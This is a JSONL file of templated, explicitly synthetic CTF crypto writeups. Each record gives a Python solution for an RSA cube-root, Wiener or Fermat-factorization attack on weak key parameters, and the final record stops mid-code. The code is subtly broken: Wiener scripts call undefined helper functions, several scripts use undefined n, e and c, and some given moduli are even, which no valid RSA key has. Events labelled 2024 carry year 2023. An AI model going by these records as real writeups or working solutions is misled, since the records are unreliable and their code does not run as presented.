{"id": "synthetic_rsa_058", "team": "synthetic_team_4", "event": "CTF_2024_Event_10", "challenge_name": "RSA Small Exponent Attack #59", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 9501406131570248901350382327065326438365618924227488415499036755278643622962429198474898410737311487086870922375885364394068345967703639008676304923904569461531916658365336172780499530935566095203389575658662477074776329104445288240787671418659722751373155822131083006875120953045520863960867012015676\ne = 3\nc = 8635845430020161651978126312251456355100049246154665425578911337359857018469000426272596004822698488657729831689105886661888976017219887985494781267625037999171010029384889142998717534941337632203174903801100243645507970588770641994633433315155647534035724951365246035261265403632996498377711948866649\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 9501406131570248901350382327065326438365618924227488415499036755278643622962429198474898410737311487086870922375885364394068345967703639008676304923904569461531916658365336172780499530935566095203389575658662477074776329104445288240787671418659722751373155822131083006875120953045520863960867012015676\ne = 3\nc = 8635845430020161651978126312251456355100049246154665425578911337359857018469000426272596004822698488657729831689105886661888976017219887985494781267625037999171010029384889142998717534941337632203174903801100243645507970588770641994633433315155647534035724951365246035261265403632996498377711948866649\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/58", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826583", "synthetic": true}
{"id": "synthetic_rsa_059", "team": "synthetic_team_3", "event": "CTF_2024_Event_11", "challenge_name": "RSA Wiener Attack #60", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/59", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826598", "synthetic": true}
{"id": "synthetic_rsa_060", "team": "synthetic_team_5", "event": "CTF_2024_Event_6", "challenge_name": "RSA Wiener Attack #61", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/60", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826618", "synthetic": true}
{"id": "synthetic_rsa_061", "team": "synthetic_team_8", "event": "CTF_2024_Event_11", "challenge_name": "RSA Wiener Attack #62", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/61", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826636", "synthetic": true}
{"id": "synthetic_rsa_062", "team": "synthetic_team_2", "event": "CTF_2024_Event_5", "challenge_name": "RSA Fermat Factorization #63", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/62", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826650", "synthetic": true}
{"id": "synthetic_rsa_063", "team": "synthetic_team_8", "event": "CTF_2024_Event_1", "challenge_name": "RSA Small Exponent Attack #64", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 23400088016905920577955999402605337142271972961898385047081705437002430503731172053509692805055672743822379001343033941512326837208874695017842123110421159590238289384355803373820713948626782004401414684464207516157852953997897587378667951641683022090168539782888637523139958603335692424963358851781636\ne = 3\nc = 14701402941959438405649947694794663083360650251351664803102895539843318568347876632101773659808073924027061064633539460378513009775830718938827761968198281210365330478658880719449198706112909200864574085909979225964838405348113207602949421233761652499206544093125178123610441139903672605906478287306376\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 23400088016905920577955999402605337142271972961898385047081705437002430503731172053509692805055672743822379001343033941512326837208874695017842123110421159590238289384355803373820713948626782004401414684464207516157852953997897587378667951641683022090168539782888637523139958603335692424963358851781636\ne = 3\nc = 14701402941959438405649947694794663083360650251351664803102895539843318568347876632101773659808073924027061064633539460378513009775830718938827761968198281210365330478658880719449198706112909200864574085909979225964838405348113207602949421233761652499206544093125178123610441139903672605906478287306376\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/63", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826673", "synthetic": true}
{"id": "synthetic_rsa_064", "team": "synthetic_team_1", "event": "CTF_2024_Event_14", "challenge_name": "RSA Wiener Attack #65", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/64", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826688", "synthetic": true}
{"id": "synthetic_rsa_065", "team": "synthetic_team_7", "event": "CTF_2024_Event_9", "challenge_name": "RSA Fermat Factorization #66", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/65", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826701", "synthetic": true}
{"id": "synthetic_rsa_066", "team": "synthetic_team_7", "event": "CTF_2024_Event_18", "challenge_name": "RSA Small Exponent Attack #67", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 15862074192372044639627047951204274647866016315072700389563773085555154930742747460600053114468349166313849589136518611128198201069005927219778554292255289505631359441439955061697683884296029209330269486911036791038039304810837141637719065692495792066285188940754414861657279653757764680382209353379575\ne = 3\nc = 8156309911962017809801094468077361746972988386082219196092977073880678137129231929575881545959223423866567793245357200941269711481313324075504707104471750424606847272871404782002247591183609306402891018590130827578566729112909363939118908614500549315701095573209242592522387887619532792990104041862198\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 15862074192372044639627047951204274647866016315072700389563773085555154930742747460600053114468349166313849589136518611128198201069005927219778554292255289505631359441439955061697683884296029209330269486911036791038039304810837141637719065692495792066285188940754414861657279653757764680382209353379575\ne = 3\nc = 8156309911962017809801094468077361746972988386082219196092977073880678137129231929575881545959223423866567793245357200941269711481313324075504707104471750424606847272871404782002247591183609306402891018590130827578566729112909363939118908614500549315701095573209242592522387887619532792990104041862198\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/66", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826723", "synthetic": true}
{"id": "synthetic_rsa_067", "team": "synthetic_team_4", "event": "CTF_2024_Event_19", "challenge_name": "RSA Small Exponent Attack #68", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 42666828339289156398120083084573906162960310765712753448768718181940673263274587546020578439953075783909369455259526386387866838437199964869854573893450123353006866791572617772382301770395523259565561337196006982751184021282622449676319018239595530821074548586254594529027218256934922722533906821523710\ne = 3\nc = 38052161295672122993047373377766677604308962327140079844102598494433167730609476526031248628623248272521005160705584768889179197366063235760223094780306062860824193510827680079577340043104657602561602762642755005651155478539345164629002444738942972783658410814329760007643870334202369637348832723411815\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 42666828339289156398120083084573906162960310765712753448768718181940673263274587546020578439953075783909369455259526386387866838437199964869854573893450123353006866791572617772382301770395523259565561337196006982751184021282622449676319018239595530821074548586254594529027218256934922722533906821523710\ne = 3\nc = 38052161295672122993047373377766677604308962327140079844102598494433167730609476526031248628623248272521005160705584768889179197366063235760223094780306062860824193510827680079577340043104657602561602762642755005651155478539345164629002444738942972783658410814329760007643870334202369637348832723411815\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/67", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826744", "synthetic": true}
{"id": "synthetic_rsa_068", "team": "synthetic_team_6", "event": "CTF_2024_Event_10", "challenge_name": "RSA Wiener Attack #69", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/68", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826759", "synthetic": true}
{"id": "synthetic_rsa_069", "team": "synthetic_team_4", "event": "CTF_2024_Event_20", "challenge_name": "RSA Fermat Factorization #70", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/69", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826772", "synthetic": true}
{"id": "synthetic_rsa_070", "team": "synthetic_team_1", "event": "CTF_2024_Event_17", "challenge_name": "RSA Small Exponent Attack #71", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 19077213907990710500523472376987951355324845998665482990346505005732233884504789779275761003785699861727086501530612507287654930257157623513153193783855138192358414476869860140453304240210778914254026235564249853014624634071853344196342570221534669577869288449159171545408597969740457524702658886554112\ne = 3\nc = 16878130077503731129648758449067713979698474319591531977600867169905904274862258161610250137919030121057594941264186146248339367327347666032232483514412530360131657433872672818019332100792452727628769812061058289282447265225900236041835047326906818342643855724723113982390386773069177399917159437278568\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 19077213907990710500523472376987951355324845998665482990346505005732233884504789779275761003785699861727086501530612507287654930257157623513153193783855138192358414476869860140453304240210778914254026235564249853014624634071853344196342570221534669577869288449159171545408597969740457524702658886554112\ne = 3\nc = 16878130077503731129648758449067713979698474319591531977600867169905904274862258161610250137919030121057594941264186146248339367327347666032232483514412530360131657433872672818019332100792452727628769812061058289282447265225900236041835047326906818342643855724723113982390386773069177399917159437278568\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/70", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826795", "synthetic": true}
{"id": "synthetic_rsa_071", "team": "synthetic_team_1", "event": "CTF_2024_Event_15", "challenge_name": "RSA Wiener Attack #72", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * 